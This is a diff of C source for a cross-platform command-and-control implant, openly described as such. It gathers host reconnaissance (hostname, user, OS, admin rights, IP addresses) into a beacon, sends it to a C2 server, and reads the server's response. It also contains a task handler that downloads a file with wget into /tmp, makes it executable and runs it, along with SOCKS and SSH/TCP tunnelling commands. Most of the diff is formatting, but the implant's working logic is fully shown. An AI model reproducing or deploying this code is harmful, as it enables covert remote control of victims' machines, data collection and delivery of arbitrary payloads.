@@ -15,7 +15,7 @@
  * - sending back execution information to the C2 server.
  */
 #ifndef WIN32
-# define _GNU_SOURCE
+#define _GNU_SOURCE
 #endif
 
 #include <stdio.h>
@@ -23,27 +23,27 @@
 #include <string.h>
 
 #ifdef WIN32
-# include <winsock2.h>
-# include <ws2tcpip.h>
-# include <windows.h>
-# include <iphlpapi.h>
-# pragma comment(lib, "advapi32.lib")
-# pragma comment(lib, "iphlpapi.lib")
-# pragma comment(lib, "ws2_32.lib")
-# pragma comment(lib, "version.lib") // -lVersion
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+#include <iphlpapi.h>
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "version.lib")	// -lVersion
 #else
-# include <unistd.h>
-# include <errno.h>
-# include <libgen.h>
-# include <pwd.h>
-# include <sys/utsname.h>
-# include <ifaddrs.h>
-# include <arpa/inet.h>
-# include <sys/types.h>
-# include <sys/socket.h>
-# include <netdb.h>
-# include <signal.h>
-# include <wait.h>
+#include <unistd.h>
+#include <errno.h>
+#include <libgen.h>
+#include <pwd.h>
+#include <sys/utsname.h>
+#include <ifaddrs.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <signal.h>
+#include <wait.h>
 #endif
 
 #ifdef WIN32
@@ -54,6 +54,7 @@
 # define SOCKET_T int
 # define SLEEP(x) sleep(x)
 # define CLOSE(y) close(y)
+# define SOCKET_ERROR (-1)
 #endif
 
 #include "beacon.h"
@@ -63,7 +64,7 @@
 #include "ssh.h"
 #include "socks.h"
 
-#define RHOST "192.168.1.13"
+#define RHOST "127.0.0.1"
 #define RPORT 8000
 #define RPORT_STR "8000"
 #define BEACON_RESP_MAX_SIZE 1024
@@ -74,8 +75,7 @@
 
 #define STD_TIMEOUT_SEC 30
 
-int timeout = 30; // seconds
-
+int timeout = 30;		// seconds
 
 /**********************************************************/
 /*                   Creating the beacon                  */
@@ -97,7 +97,7 @@ static char *get_hostname()
 	DWORD buf_size = 150;
 	int i;
 	if (GetComputerNameA(info_buf, &buf_size))
-		for (i = 0; i <= buf_size; i++) // include terminating '\0'
+		for (i = 0; i <= buf_size; i++)	// include terminating '\0'
 			hostname[i] = info_buf[i];
 	else
 		strcpy(hostname, "");
@@ -136,7 +136,7 @@ static char *get_username()
 
 static char *get_os()
 {
-	char *os = malloc(64); // ASCII
+	char *os = malloc(64);
 	if (os == NULL)
 		return NULL;
 
@@ -155,49 +155,51 @@ static char *get_os()
 		strcpy(os, "");
 		return os;
 	}
-    if (!GetFileVersionInfo(lpszFilePath, 0, dwFVISize, lpVersionInfo)) {
-    	free(lpVersionInfo);
-    	printf("GetFileVersionInfo failed\n");
-    	strcpy(os, "");
-    	return os;
-    }
-    
-    UINT uLen;
-    VS_FIXEDFILEINFO *lpFfi;
-    if (!VerQueryValue(lpVersionInfo, TEXT("\\"), (LPVOID *) &lpFfi, &uLen)) {
-    	free(lpVersionInfo);
-    	printf("VerQueryValue\n");
-    	strcpy(os, "");
-    	return os;
-    }
+	if (!GetFileVersionInfo(lpszFilePath, 0, dwFVISize, lpVersionInfo)) {
+		free(lpVersionInfo);
+		printf("GetFileVersionInfo failed\n");
+		strcpy(os, "");
+		return os;
+	}
 
-    DWORD dwFileVersionMS = lpFfi->dwProductVersionMS;
-    DWORD dwFileVersionLS = lpFfi->dwProductVersionLS;
+	UINT uLen;
+	VS_FIXEDFILEINFO *lpFfi;
+	if (!VerQueryValue
+	    (lpVersionInfo, TEXT("\\"), (LPVOID *) & lpFfi, &uLen)) {
+		free(lpVersionInfo);
+		printf("VerQueryValue\n");
+		strcpy(os, "");
+		return os;
+	}
 
-    free(lpVersionInfo);
+	DWORD dwFileVersionMS = lpFfi->dwProductVersionMS;
+	DWORD dwFileVersionLS = lpFfi->dwProductVersionLS;
 
-    DWORD dwLeftMost = HIWORD(dwFileVersionMS);
-    DWORD dwSecondLeft = LOWORD(dwFileVersionMS);
-    DWORD dwSecondRight = HIWORD(dwFileVersionLS);
-    DWORD dwRightMost = LOWORD(dwFileVersionLS);
+	free(lpVersionInfo);
 
-    sprintf(os, "%d.%d.%d.%d", dwLeftMost, dwSecondLeft,
-    	dwSecondRight, dwRightMost);
+	DWORD dwLeftMost = HIWORD(dwFileVersionMS);
+	DWORD dwSecondLeft = LOWORD(dwFileVersionMS);
+	DWORD dwSecondRight = HIWORD(dwFileVersionLS);
+	DWORD dwRightMost = LOWORD(dwFileVersionLS);
+
+	sprintf(os, "%d.%d.%d.%d", dwLeftMost, dwSecondLeft,
+		dwSecondRight, dwRightMost);
 #else
-    struct utsname utsn;
-    if (uname(&utsn) == -1) {
+	struct utsname utsn;
+	if (uname(&utsn) == -1) {
 		strcpy(os, "");
 	} else {
-		sprintf(os, "%s %s %s", utsn.sysname, utsn.release, utsn.machine);
+		sprintf(os, "%s %s %s", utsn.sysname, utsn.release,
+			utsn.machine);
 	}
 #endif
 
-    return os;
+	return os;
 }
 
 static char *get_admin()
 {
-	char *admin = malloc(2); // "Y/N"
+	char *admin = malloc(2);	// "Y/N"
 	if (admin == NULL)
 		return NULL;
 
@@ -209,13 +211,15 @@ static char *get_admin()
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
 		TOKEN_ELEVATION Elevation;
 		DWORD cbSize = sizeof(TOKEN_ELEVATION);
-		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
+		if (GetTokenInformation
+		    (hToken, TokenElevation, &Elevation, sizeof(Elevation),
+		     &cbSize)) {
 			fRet = Elevation.TokenIsElevated;
 		}
 	}
 	if (hToken)
 		CloseHandle(hToken);
-	is_admin = (int) fRet;
+	is_admin = (int)fRet;
 #else
 	uid_t uid = getuid();
 	uid_t euid = geteuid();
@@ -233,50 +237,50 @@ static int get_ips(char *addrs[], size_t max_addrs)
 
 #ifdef WIN32
 	PMIB_IPADDRTABLE pIPAddrTable;
-    DWORD dwSize = 0;
-    DWORD dwRetVal = 0;
-    IN_ADDR IPAddr;
+	DWORD dwSize = 0;
+	DWORD dwRetVal = 0;
+	IN_ADDR IPAddr;
 
-    pIPAddrTable = malloc(sizeof(MIB_IPADDRTABLE));
-    if (pIPAddrTable == NULL)
-    	return 0;
+	pIPAddrTable = malloc(sizeof(MIB_IPADDRTABLE));
+	if (pIPAddrTable == NULL)
+		return 0;
 
 	if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) ==
-        ERROR_INSUFFICIENT_BUFFER) {
-        free(pIPAddrTable);
-        pIPAddrTable = malloc(dwSize);
-    }
-    if (pIPAddrTable == NULL) {
-        printf("[*] Memory allocation failed for GetIPAddrTable\n");
-        return 0;
-    }
+	    ERROR_INSUFFICIENT_BUFFER) {
+		free(pIPAddrTable);
+		pIPAddrTable = malloc(dwSize);
+	}
+	if (pIPAddrTable == NULL) {
+		printf("[*] Memory allocation failed for GetIPAddrTable\n");
+		return 0;
+	}
 
-    if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR) {
-    	printf("[-] GetIpAddrTable failed\n");
-    	free(pIPAddrTable);
-    	return 0;
-    }
+	if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR) {
+		printf("[-] GetIpAddrTable failed\n");
+		free(pIPAddrTable);
+		return 0;
+	}
 
-    int i;
-    for (i = 0; i < (int) pIPAddrTable->dwNumEntries; i++) {
-        IPAddr.S_un.S_addr = (u_long) pIPAddrTable->table[i].dwAddr;
-        char lpszIP[MAX_IP_ENTRY_SIZE];
-        sprintf(lpszIP, inet_ntoa(IPAddr));
-        if (strncmp(lpszIP, "127", 3) == 0)
-            continue;
+	int i;
+	for (i = 0; i < (int)pIPAddrTable->dwNumEntries; i++) {
+		IPAddr.S_un.S_addr = (u_long) pIPAddrTable->table[i].dwAddr;
+		char lpszIP[MAX_IP_ENTRY_SIZE];
+		sprintf(lpszIP, inet_ntoa(IPAddr));
+		if (strncmp(lpszIP, "127", 3) == 0)
+			continue;
 
-        char *entry = malloc(MAX_IP_ENTRY_SIZE);
-        if (entry) {
-        	strcpy(entry, lpszIP);
-	        addrs[n_ips] = entry;
-	        n_ips++;
+		char *entry = malloc(MAX_IP_ENTRY_SIZE);
+		if (entry) {
+			strcpy(entry, lpszIP);
+			addrs[n_ips] = entry;
+			n_ips++;
 
-	        if (n_ips > max_addrs)
-	            break;
+			if (n_ips > max_addrs)
+				break;
 		}
 	}
 
-    free(pIPAddrTable);
+	free(pIPAddrTable);
 #else
 	struct ifaddrs *ifaddr, *ifa;
 	if (getifaddrs(&ifaddr) == -1) {
@@ -306,7 +310,7 @@ static int get_ips(char *addrs[], size_t max_addrs)
 
 				if (n_ips > max_addrs)
 					break;
-			}	
+			}
 		}
 	}
 #endif
@@ -325,9 +329,9 @@ static int is_internal_ip(char *addr)
 	sscanf(addr, "%u.%u.%u.%u", &f, &s, &t, &fo);
 
 	return (f == 10 || f == 127 ||
-	       (f == 100 && s >= 64 && s <= 127) ||
-	       (f == 172 && s >= 16 && s <= 31) ||
-	       (f == 169 && s == 254) || (f == 192 && s == 168));
+		(f == 100 && s >= 64 && s <= 127) ||
+		(f == 172 && s >= 16 && s <= 31) ||
+		(f == 169 && s == 254) || (f == 192 && s == 168));
 }
 
 char *get_beacon(void)
@@ -388,17 +392,21 @@ static int inet_pton(int af, const char *src, void *dst)
 	CHAR srCopy[INET6_ADDRSTRLEN];
 
 	ZeroMemory(&ss, sizeof(ss));
-	strncpy (srCopy, src, INET6_ADDRSTRLEN);
+	strncpy(srCopy, src, INET6_ADDRSTRLEN);
 	srCopy[INET6_ADDRSTRLEN] = 0;
 
 	int iRet;
-	if ((iRet = WSAStringToAddressA(srCopy, af, NULL, (struct sockaddr *)&ss, &iSize)) == 0) {
-		switch(af) {
+	if ((iRet =
+	     WSAStringToAddressA(srCopy, af, NULL, (struct sockaddr *)&ss,
+				 &iSize)) == 0) {
+		switch (af) {
 		case AF_INET:
-			*(struct in_addr *)dst = ((struct sockaddr_in *)&ss)->sin_addr;
+			*(struct in_addr *)dst =
+			    ((struct sockaddr_in *)&ss)->sin_addr;
 			return 1;
 		case AF_INET6:
-			*(struct in6_addr *)dst = ((struct sockaddr_in6 *)&ss)->sin6_addr;
+			*(struct in6_addr *)dst =
+			    ((struct sockaddr_in6 *)&ss)->sin6_addr;
 			return 1;
 		}
 	}
@@ -408,7 +416,7 @@ static int inet_pton(int af, const char *src, void *dst)
 }
 #endif
 
-int connect_to_c2(SOCKET_T *sockfd, const char *host, int port)
+int connect_to_c2(SOCKET_T * sockfd, const char *host, int port)
 {
 	/* Set host address and port */
 	struct sockaddr_in serv_addr;
@@ -444,13 +452,11 @@ int connect_to_c2(SOCKET_T *sockfd, const char *host, int port)
 		printf("[-] setsockopt\n");
 		return ABORT;
 	}
-
 #ifdef WIN32
 	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr))
 	    == SOCKET_ERROR) {
 #else
-	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
-	    0) {
+	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
 #endif
 		return RETRY;
 	}
@@ -468,11 +474,7 @@ int send_beacon(SOCKET_T sockfd, char *request, size_t request_len)
 	char *pos = request;
 	while (request_len > 0) {
 		numsent = send(sockfd, pos, request_len, 0);
-#ifdef WIN32
 		if (numsent == SOCKET_ERROR) {
-#else
-		if (numsent < 0) {
-#endif
 			return RETRY;
 		} else {
 			request_len -= numsent;
@@ -485,45 +487,7 @@ int send_beacon(SOCKET_T sockfd, char *request, size_t request_len)
 }
 
 /**********************************************************/
-/*                   Receiving the beacon                 */
-/**********************************************************/
-#if 0
-char *get_beacon_resp(int sockfd)
-{
-	char *buf = calloc(BEACON_RESP_MAX_SIZE, sizeof(char));
-	if (buf == NULL) {
-		printf("malloc\n");
-		return NULL;
-	}
-
-	printf("[*] Waiting for c2 server to reply...");
-	fflush(stdout);
-	int received = 0;
-	int tot_read = 0;
-	ssize_t numread = 0;
-	char *pos = buf;
-	do {
-		numread = recv(sockfd, pos, BEACON_RESP_MAX_SIZE - tot_read, 0);
-		if (numread > 0) {
-			tot_read += numread;
-			pos += numread;
-			received = 1;
-		} else if (numread == 0) {
-			printf("received %d bytes\n", tot_read);
-		} else if (numread == -1) {
-			if (errno == EAGAIN && errno == EWOULDBLOCK) {
-				printf(RED("timed out\n"));
-			} else {
-				printf(RED("error\n"));
-			}
-		}
-	} while (numread > 0);
-
-	return buf;
-}
-
-/**********************************************************/
-/*                     Parsing the beacon                 */
+/*                     Parsing the beacon response                */
 /**********************************************************/
 
 static char *xml_get_attribute(const char *xml, const char *attr)
@@ -538,7 +502,7 @@ static char *xml_get_attribute(const char *xml, const char *attr)
 
 	char *value = malloc(value_len + 1);	// '\0'
 	if (value == NULL) {
-		printf("malloc\n");
+		printf("[-] malloc\n");
 		return NULL;
 	}
 
@@ -592,7 +556,6 @@ static int xml_parse_response(char *response, struct command **cmds)
 		char *pos = cmds_section;
 		struct command *last;
 
-		// replace with recursive function?
 		while (1) {
 			struct command *cmd = calloc(1, sizeof(struct command));
 
@@ -618,6 +581,34 @@ static int xml_parse_response(char *response, struct command **cmds)
 	return cmd_num;
 }
 
+char *get_beacon_resp(SOCKET_T sockfd)
+{
+	char *buf = calloc(BEACON_RESP_MAX_SIZE, 1);
+	if (buf == NULL) {
+		printf("[-] malloc\n");
+		return NULL;
+	}
+
+	int tot_read = 0;
+	int numread = 0;
+	do {
+		numread = recv(sockfd, buf + tot_read, BEACON_RESP_MAX_SIZE - tot_read, 0);
+		if (numread == SOCKET_ERROR) {
+			printf("[-] recv\n");
+			break;
+		} else if (numread == 0) {
+			break;
+		} else {
+			tot_read += numread;
+		}
+	} while (numread > 0);
+
+	return buf;
+}
+
+/********************* Exec commands ********************/
+
+#if 0
 static int exec_command(char *cmd, char *param);
 
 #define EXEC_SUCCESS 1
@@ -678,7 +669,6 @@ struct process tcp_tunnel = { 0 };
 struct process ssh_tunnel = { 0 };
 struct process task = { 0 };
 struct process socks_sv = { 0 };
-
 
 static int exec_socks_server(int lport)
 {
@@ -826,7 +816,8 @@ static int exec_command(char *cmd, char *param)
 			       lport);
 			ret = exec_open_tcp_tunnel(lport, rport);
 			if (ret == EXEC_SUCCESS) {
-				printf(GREEN("[*] Opened TCP tunnel on port %d\n"),
+				printf(GREEN
+				       ("[*] Opened TCP tunnel on port %d\n"),
 				       lport);
 				printf(GREEN("[*] Opened dynamic tunnel\n"));
 			} else {
@@ -849,7 +840,7 @@ static int exec_command(char *cmd, char *param)
 			"wget -O /tmp/%s %s > /dev/null 2>&1 && chmod u+x /tmp/%s && /tmp/%s > /dev/null 2>&1",
 			filename, param, filename, filename);
 		printf(GREEN("[TASK] %s\n"), cmd_str);
-		ret = system(cmd_str); // replace with fork and exec
+		ret = system(cmd_str);	// replace with fork and exec
 		if (ret == -1) {
 			/* Child process could not be created or status
 			   could not be retrieved */
@@ -900,12 +891,12 @@ static int register_sigchld_handler()
 
 int main(int argc, char *argv[])
 {
-//	printf("[*] Registering SIGCHLD handler for new process...");
-//	if (register_sigchld_handler() == -1) {
-//		printf(RED("failed\n"));
-//		return -1;
-//	}
-//	printf("done\n");
+//      printf("[*] Registering SIGCHLD handler for new process...");
+//      if (register_sigchld_handler() == -1) {
+//              printf(RED("failed\n"));
+//              return -1;
+//      }
+//      printf("done\n");
 
 	printf("[*] Acquiring beacon...");
 	char *beacon = get_beacon();
@@ -927,11 +918,13 @@ int main(int argc, char *argv[])
 		"Content-Length: %d\r\n\r\n%s", strlen(beacon), beacon);
 	printf("done\n");
 
+#ifdef WIN32
 	WSADATA wsaData;
-	if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
 		printf("[-] WSAStartup failed\n");
 		return -1;
 	}
+#endif
 
 	while (1) {
 		SOCKET_T sockfd;
@@ -963,8 +956,10 @@ int main(int argc, char *argv[])
 			SLEEP(timeout);
 		} else {
 			printf("[*] Beacon sent.\n");
-			char *response = NULL;
-			//char *response = get_beacon_resp(sockfd);
+			printf("[*] Waiting for c2 server to reply...\n");
+			char *response = get_beacon_resp(sockfd);
+			printf("[*] Closing socket\n");
+			CLOSE(sockfd);
 			if (response) {
 				printf("[*] Server response:\n%s\n", response);
 				printf(BLUE("[*] Preparing execution...\n"));
